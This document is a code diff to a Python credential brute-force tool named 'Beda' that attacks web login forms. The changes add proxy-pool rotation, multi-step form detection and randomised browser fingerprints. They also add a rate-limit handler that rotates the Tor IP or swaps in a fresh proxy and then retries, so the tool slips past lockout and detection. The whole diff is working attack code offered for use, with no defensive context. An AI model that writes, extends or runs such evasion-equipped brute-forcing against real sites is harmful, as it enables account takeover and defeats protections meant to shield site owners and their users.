@@ -2,8 +2,9 @@ import requests
 import urllib3
 import time
 from rich.console import Console
-from analyzer import analyze_form, detect_success, detect_rate_limit
+from analyzer import analyze_form, analyze_multistep, detect_success, detect_rate_limit
 from tor_manager import get_tor_proxies, change_ip, get_current_ip
+from fingerprint import get_random_fingerprint
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 console = Console()
@@ -11,8 +12,8 @@ console = Console()
 
 def run_brute(url, username, wordlist, user_field=None, pass_field=None,
               success_text=None, fail_text=None, rotate_every=2,
-              use_tor=False, delay=0, timeout=5, verbose=False,
-              extra_headers=None, extra_data=None):
+              use_tor=False, proxy_pool=None, delay=0, timeout=5, verbose=False,
+              extra_headers=None, extra_data=None, spoof_fingerprint=False):
     """
     Main brute force engine for Beda.
     Returns result dict or None.
@@ -27,6 +28,13 @@ def run_brute(url, username, wordlist, user_field=None, pass_field=None,
         return None
 
     proxies = get_tor_proxies() if use_tor else None
+    current_proxy_dict = None
+
+    # ── Proxy pool setup ──
+    if proxy_pool and proxy_pool.has_proxies():
+        current_proxy_dict, current_ip = proxy_pool.get_proxy()
+        proxies = current_proxy_dict
+        console.print(f"  [cyan][PROXY] Using proxy: {current_ip}[/cyan]")
 
     # ── Session ──
     session = requests.Session()
@@ -36,7 +44,13 @@ def run_brute(url, username, wordlist, user_field=None, pass_field=None,
 
     # ── Auto-detect form ──
     console.print(f"\n  [cyan][BEDA] Analyzing login form...[/cyan]")
-    form = analyze_form(url, session, timeout=timeout)
+
+    # Try multi-step first
+    form = analyze_multistep(url, session, username, timeout=timeout)
+
+    # Fallback to normal
+    if not form:
+        form = analyze_form(url, session, timeout=timeout)
 
     if not form:
         console.print(f"  [red][BEDA] Could not analyze form — use --user-field and --pass-field[/red]")
@@ -87,6 +101,15 @@ def run_brute(url, username, wordlist, user_field=None, pass_field=None,
                 new_ip = get_current_ip(proxies)
                 console.print(f"  [dim][TOR] New IP: {new_ip}[/dim]")
 
+        # ── Fingerprint Spoofing ──
+        if spoof_fingerprint:
+            fp = get_random_fingerprint()
+            session.headers.update(fp)
+            if extra_headers:
+                session.headers.update(extra_headers)
+            if verbose:
+                console.print(f"  [dim][FP] UA: {fp['User-Agent'][:60]}...[/dim]")
+
         # ── Re-fetch CSRF ──
         csrf_value = form["csrf_value"]
         if form["csrf_field"]:
@@ -117,11 +140,34 @@ def run_brute(url, username, wordlist, user_field=None, pass_field=None,
                 verify=False
             )
 
-            # ── Rate limit check ──
+            # ── Smart Error Handling ──
             rate = detect_rate_limit(response)
             if rate:
-                console.print(f"  [yellow][BEDA] ⚠ {rate} — pausing 5s...[/yellow]")
-                time.sleep(5)
+                console.print(f"  [yellow][BEDA] ⚠ {rate}[/yellow]")
+                if use_tor:
+                    console.print(f"  [cyan][BEDA] Rotating Tor IP immediately...[/cyan]")
+                    change_ip()
+                    session = requests.Session()
+                    session.verify = False
+                    if extra_headers:
+                        session.headers.update(extra_headers)
+                    if verbose:
+                        new_ip = get_current_ip(proxies)
+                        console.print(f"  [cyan][TOR] New IP: {new_ip}[/cyan]")
+                elif proxy_pool and proxy_pool.has_proxies():
+                    # Ban current proxy and get new one
+                    proxy_pool.ban_proxy(current_proxy_dict)
+                    current_proxy_dict, current_ip = proxy_pool.get_proxy()
+                    proxies = current_proxy_dict
+                    console.print(f"  [cyan][PROXY] Switched to: {current_ip}[/cyan]")
+                    session = requests.Session()
+                    session.verify = False
+                    if extra_headers:
+                        session.headers.update(extra_headers)
+                else:
+                    console.print(f"  [yellow][BEDA] Pausing 5s...[/yellow]")
+                    time.sleep(5)
+                passwords.insert(0, password)
                 continue
 
             # ── Success check ──
